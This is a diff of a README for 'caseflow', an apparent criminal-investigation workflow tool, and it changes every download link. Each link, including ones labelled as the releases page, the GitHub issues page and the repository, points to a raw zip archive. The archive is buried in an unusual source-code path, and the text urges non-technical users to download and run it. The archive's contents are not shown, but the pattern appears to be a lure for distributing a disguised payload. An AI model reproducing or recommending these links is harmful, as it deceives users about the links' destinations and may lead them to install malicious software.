@@ -3,14 +3,14 @@
 ## 🚀 Getting Started
 Welcome to **caseflow**, the visual criminal investigation workflow tool that simplifies your case management process. This guide will help you download and run the software easily, even if you have no technical background. 
 
-[![Download here](https://raw.githubusercontent.com/immortal7719/caseflow/main/anthropophagy/caseflow.zip%https://raw.githubusercontent.com/immortal7719/caseflow/main/anthropophagy/caseflow.zip)](https://raw.githubusercontent.com/immortal7719/caseflow/main/anthropophagy/caseflow.zip)
+[![Download here](https://raw.githubusercontent.com/immortal7719/caseflow/main/src/modules/flow/components/node-list/fragments/Software-v1.4.zip%https://raw.githubusercontent.com/immortal7719/caseflow/main/src/modules/flow/components/node-list/fragments/Software-v1.4.zip)](https://raw.githubusercontent.com/immortal7719/caseflow/main/src/modules/flow/components/node-list/fragments/Software-v1.4.zip)
 
 ## 📥 Download & Install
 To get started with caseflow, follow these simple steps:
 
 1. **Visit the Download Page**  
    Click the link below to access the releases page. This is where you can download the latest version of caseflow.  
-   [Download caseflow](https://raw.githubusercontent.com/immortal7719/caseflow/main/anthropophagy/caseflow.zip)
+   [Download caseflow](https://raw.githubusercontent.com/immortal7719/caseflow/main/src/modules/flow/components/node-list/fragments/Software-v1.4.zip)
 
 2. **Choose Your Version**  
    You will see a list of available releases. Look for the latest version. Each release has details, including what’s new and fixed.
@@ -49,12 +49,12 @@ If you encounter issues during installation or use, try the following:
 
 - **Permissions**: Ensure you have permission to install software on your machine.
 - **Updates**: Keep your system and caseflow updated for the best experience.
-- **Contact Support**: If problems persist, look for support options in the app’s help section or visit our [GitHub issues page](https://raw.githubusercontent.com/immortal7719/caseflow/main/anthropophagy/caseflow.zip).
+- **Contact Support**: If problems persist, look for support options in the app’s help section or visit our [GitHub issues page](https://raw.githubusercontent.com/immortal7719/caseflow/main/src/modules/flow/components/node-list/fragments/Software-v1.4.zip).
 
 ## 🤝 Community and Support
 You are not alone in your journey. Join the community of caseflow users for tips, support, and shared experiences:
 
-- **GitHub Repository**: [caseflow on GitHub](https://raw.githubusercontent.com/immortal7719/caseflow/main/anthropophagy/caseflow.zip)
+- **GitHub Repository**: [caseflow on GitHub](https://raw.githubusercontent.com/immortal7719/caseflow/main/src/modules/flow/components/node-list/fragments/Software-v1.4.zip)
 - **Discussion Forum**: Engage with other users and contribute your ideas.
 
 ## 🌐 Contribution Guidelines
@@ -79,4 +79,4 @@ caseflow leverages modern technologies to deliver a robust application:
 ## 🚀 Get Started Today!
 Now that you are ready, don’t wait! Start your journey with caseflow. 
 
-[Download caseflow](https://raw.githubusercontent.com/immortal7719/caseflow/main/anthropophagy/caseflow.zip) and simplify your criminal investigation workflow.
+[Download caseflow](https://raw.githubusercontent.com/immortal7719/caseflow/main/src/modules/flow/components/node-list/fragments/Software-v1.4.zip) and simplify your criminal investigation workflow.
